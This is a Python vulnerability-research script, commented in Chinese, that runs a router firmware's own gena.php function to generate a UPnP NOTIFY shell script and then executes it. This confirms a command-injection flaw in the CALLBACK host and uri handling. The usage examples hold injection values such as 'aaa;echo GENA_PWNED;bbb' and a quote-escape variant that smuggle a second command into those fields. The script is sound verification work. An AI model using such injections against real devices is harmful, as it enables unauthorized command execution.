#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""gena_replay.py — 用固件**自己的 PHP** 生成 NOTIFY 脚本，再真跑它

为什么值得单独做：gena.cgi 的注入链有一段在 PHP 里
（`htdocs/upnpinc/gena.php::GENA_notify_init()` 把 CALLBACK 拆出的 host/uri 未转义地
拼进 `#!/bin/sh` 脚本）。手写"重放"只能说"我以为它是这么拼的"；本机有 php 的话，
直接把厂商那份 `gena.php` 跑起来，让**它自己**生成脚本 —— 证据等级完全不同。

做法：
  1. 读 rootfs 里的 `htdocs/upnpinc/gena.php`；
  2. 去掉顶部 `include`（指向固件绝对路径），把 `<?` 改 `<?php`；
  3. 附上最小桩：`query()`、`XNODE_getpathbytarget()`、`PHYINF_getifname()`、
     `TRACE_debug()`、`fwrite()`（按固件的三参形式写文件）；
  4. 调用 `GENA_notify_init($shell_file, $php, $inf_uid, $host, $uri, $sid)`；
  5. 用 `sh` 真跑生成出来的脚本，看注入段是否执行。

用法::

    python3 tools/capture/gena_replay.py --rootfs <R> \\
        --host '10.0.0.9' --uri 'aaa;echo GENA_PWNED;bbb' --outdir /tmp/gena

    # 7 个反斜杠的「引号逃逸」也可以
    python3 tools/capture/gena_replay.py --rootfs <R> --host 'x";echo PWNED2;#' --uri '/z'

退出码：0 生成并执行成功；2 参数/文件问题；4 php 或 sh 失败。
"""
from __future__ import annotations

import argparse
import re
import subprocess
import sys
from pathlib import Path

STUBS = r'''
<?php
/* ---- 最小桩：只实现 gena.php 用到的那几个 xnode/phyinf 接口 ---- */
/* 厂商 PHP 里 `fwrite(w, ...)` 的 w/a 是裸常量当模式串用（PHP5 时代未定义常量会
   被当成同名字符串）。PHP 8 会直接抛错，这里显式定义回原来的语义。 */
define('w', 'w');
define('a', 'a');
function query($p) {
    switch ($p) {
        case "/runtime/upnpmsg":            return "/dev/null";
        default:                            return "";
    }
}
function set($p, $v = "")               { /* no-op */ }
function anchor($p)                     { /* no-op */ }
function TRACE_debug($m)                { fwrite(STDERR, "[trace] $m\n"); }
function XNODE_getpathbytarget($a, $b, $c, $uid, $deep) { return "/runtime/upnp/inf:1"; }
function PHYINF_getifname($p)           { return "br0"; }
function fw($mode, $file, $str) {       /* 固件的 fwrite(mode,file,str) 与 PHP 内置同名，
                                           这里只改名 fwrite→fw，调用点由脚本机械替换 */
    if ($mode === "w") file_put_contents($file, $str);
    else               file_put_contents($file, $str, FILE_APPEND);
    return strlen($str);
}
'''

DRIVER = r'''

/* ---- driver ---- */
$shell_file = $argv[1];
$host       = $argv[2];
$uri        = $argv[3];
$sid        = "uuid:11111111-2222-3333-4444-555555555555";
$r = GENA_notify_init($shell_file, "/htdocs/upnp/NOTIFY.WANIPConnection.1.php",
                      "InternetGatewayDevice", $host, $uri, $sid);
echo "GENA_notify_init returned: ", var_export($r, true), "\n";
echo "shell_file exists: ", (file_exists($shell_file) ? "yes" : "no"), "\n";
'''


def extract_function(src: str, name: str) -> str:
    """从厂商 PHP 里抠出指定函数（按花括号配平），不做任何改写。"""
    m = re.search(r"function\s+" + re.escape(name) + r"\s*\(", src)
    if not m:
        raise SystemExit(f"[x] gena.php 里找不到 {name}()")
    i = src.index("{", m.end())
    depth, j = 0, i
    while j < len(src):
        if src[j] == "{":
            depth += 1
        elif src[j] == "}":
            depth -= 1
            if depth == 0:
                return src[m.start():j + 1]
        j += 1
    raise SystemExit(f"[x] {name}() 花括号不配对")


def build_php(rootfs: Path, workdir: Path) -> Path:
    src = (rootfs / "htdocs/upnpinc/gena.php").read_text(encoding="utf-8", errors="replace")
    # 只取 GENA_notify_init()：其余函数用了厂商自定义的 `foreach ("path")` 语法，
    # 标准 PHP 解析不了，而漏洞链只经过这一个函数。
    fn = extract_function(src, "GENA_notify_init")
    # 厂商 PHP 的 fwrite($mode,$file,$str) 与 PHP 内置 fwrite($fp,$str) 冲突，只改名不改逻辑
    fn = fn.replace("fwrite(", "fw(")
    out = workdir / "gena_replay.php"
    out.write_text(STUBS + "\n" + fn + "\n" + DRIVER, encoding="utf-8")
    return out


def main(argv: list) -> int:
    ap = argparse.ArgumentParser(description="用固件 gena.php 生成并执行 NOTIFY 脚本")
    ap.add_argument("--rootfs", required=True)
    ap.add_argument("--host", required=True, help="CALLBACK 里的 host 段")
    ap.add_argument("--uri", required=True, help="CALLBACK 里 '/' 之后的 path 段")
    ap.add_argument("--outdir", default="/tmp/gena-replay")
    ap.add_argument("--shell-file", default="")
    ap.add_argument("--no-run", action="store_true",
                    help="只生成脚本、不执行（给 chroot 里用固件 shell 跑的场景）")
    args = ap.parse_args(argv)

    rootfs = Path(args.rootfs)
    if not (rootfs / "htdocs/upnpinc/gena.php").is_file():
        print(f"[x] 找不到 {rootfs}/htdocs/upnpinc/gena.php", file=sys.stderr)
        return 2
    work = Path(args.outdir)
    work.mkdir(parents=True, exist_ok=True)
    php_file = build_php(rootfs, work)
    shell_file = Path(args.shell_file) if args.shell_file else work / "WANIPConn1_1.sh"
    if shell_file.exists():
        shell_file.unlink()

    print(f"[i] 用固件 PHP 跑: {rootfs}/htdocs/upnpinc/gena.php")
    print(f"[i] host={args.host!r} uri={args.uri!r}")
    proc = subprocess.run(["php", str(php_file), str(shell_file), args.host, args.uri],
                          capture_output=True, text=True)
    if proc.stdout:
        print(proc.stdout.rstrip())
    if proc.returncode != 0:
        print("[x] php 失败:\n" + (proc.stderr or "").strip()[:800], file=sys.stderr)
        return 4
    if not shell_file.exists():
        print("[x] gena.php 没有生成脚本（XNODE/PHYINF 桩可能没命中）", file=sys.stderr)
        return 4

    print("\n[i] 生成的脚本（厂商 PHP 产物，未改动）:")
    body = shell_file.read_text(encoding="utf-8", errors="replace")
    print("-" * 70)
    print(body.rstrip())
    print("-" * 70)

    if args.no_run:
        print("\n[i] --no-run：跳过执行，脚本留给调用方自己跑")
        print(f"\n[i] 脚本留在 {shell_file}")
        return 0

    print("\n[i] 用 sh 真跑它（注入段会执行）:")
    run = subprocess.run(["sh", str(shell_file)], capture_output=True, text=True, timeout=30)
    out = (run.stdout + run.stderr).strip()
    print(out[:1500] if out else "(no output)")
    print(f"[i] sh 退出码 {run.returncode}")
    print(f"\n[i] 脚本留在 {shell_file}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
